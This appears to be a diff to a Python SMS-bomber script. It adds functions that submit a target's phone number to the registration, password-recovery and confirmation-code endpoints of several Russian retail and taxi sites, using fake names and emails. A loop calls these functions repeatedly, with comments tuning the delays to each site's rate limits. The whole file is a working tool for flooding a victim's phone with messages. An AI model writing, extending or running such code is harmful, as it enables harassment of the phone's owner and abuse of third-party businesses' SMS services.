@@ -134,20 +134,74 @@ def karusel(phone):
                                      json={"phone": krslphn})
     print(response_karusel, response_karusel.content)
 
-
-#  надо тестить
-def taxi2412(phone):
-    tx2412phn = '%2B7' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] + '-'\
-                + phone[8:10]
-    headers = {
+#  приделать генератор мыл, тут обязательно надо
+def taxi2412regist(phone):
+    tx2412phn = '+7' + ' ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] +\
+                '-' + phone[8:10]
+    data = {
         'telephone': tx2412phn,
-        'fio': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
-        'email': 'dhjaass%40gmail.com',
+        'fio': 'Иван Иванов',
+        'email': 'dassass@gmail.com',
         'pface_register': 'true'
 
     }
-    response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/register', headers=headers)
-    print(response_taxi2412, response_taxi2412.content)
+    response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/register', data=data)
+    print(response_taxi2412, response_taxi2412.text)
+
+# timeout 60 sec
+def taxi2412recover(phone):
+    tx2412phn = '+7' + ' ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] +\
+                '-' + phone[8:10]
+    data = {
+        'phone': tx2412phn
+    }
+    response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/recover', data=data)
+    print(response_taxi2412, response_taxi2412.text)
+
+
+# timeout 180 sec
+def ostin(phone):
+    ostnphn = '%207%20' + '+' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
+              + phone[8:10]
+    response_ostin = requests.post(url=('https://ostin.com/ru/ru/secured/myaccount/myclubcard/'
+                                        'resultClubCard.jsp?type='
+                                        'sendConfirmCode&phoneNumber='+ostnphn))
+    print(response_ostin, response_ostin.text)
+
+def funday(phone):
+    fndphn = '+7%20' + '+' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
+             + phone[8:10]
+    response_funday = requests.post(url=('http://fundayshop.com/ru/ru/secured/myaccount/myclubcard/'
+                                         'resultClubCard.jsp?type='
+                                         'sendConfirmCode&phoneNumber='+fndphn))
+    print(response_funday, response_funday.text)
+
+def sela(phone):
+    slphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
+            '-' + phone[8:10]
+    data = {
+        'LastName': 'Петров',
+        'FirstName': 'Петр',
+        'BirthDate': '10.02.1978',
+        'GenderCode': '1',
+        'MobilePhone': slphn,
+        'EmailAddress': 'ashdbb@gmail.com',
+        'agree': '1'
+    }
+    response_sela = requests.post(url='https://www.sela.ru/sela/bonus/signup/', data=data)
+    print(response_sela, response_sela.content)
+
+def novextrade(phone):
+    nvxtrdphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
+            '-' + phone[8:10]
+    data = {
+        'phone': nvxtrdphn,
+        'result_ids': 'notification',
+        'is_ajax': '1'
+    }
+    response_novextrade = requests.post(url=('http://www.novex-trade.ru/index.php?dispatch='
+                                             'nvx.send_sms_confirm_code'), data=data)
+    print(response_novextrade, response_novextrade.content)
 
 
 
@@ -166,12 +220,18 @@ def generate_email():
 
 
 def run(phone, n):
-    for i in range(n):
+    for i in range(n): #  timeout 180
         kfc(phone)
-        for j in range(3):
+        taxi2412regist(phone)
+        ostin(phone)
+        funday(phone)
+        for j in range(3): #  timeout 60
             bk(phone)
             karusel(phone)
-            for k in range(12):
+            taxi2412recover(phone)
+            for k in range(10): #  timeout 0
                 sunlight(phone)
                 taxinonstop(phone)
-                sleep(5)
+                sela(phone)
+                novextrade(phone)
+                sleep(6)
